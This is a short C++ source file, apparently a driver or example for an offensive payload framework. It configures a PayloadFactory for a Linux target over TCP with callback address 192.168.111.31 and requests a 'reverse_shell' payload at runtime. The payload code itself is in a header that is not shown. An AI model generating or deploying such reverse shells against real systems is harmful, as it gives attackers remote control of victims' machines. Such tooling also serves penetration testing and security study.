#include "../include/payloadFactory.hpp"

using namespace std;

int main(){
    PayloadFactory *factory = new PayloadFactory(TARGET_LINUX,IPV4,TCP,"192.168.111.31",CSOCK_DEFAULT_PORT);
    std::vector<std::string> args;
    factory->createPayloadRuntime("reverse_shell",args);


    return 0x0;
}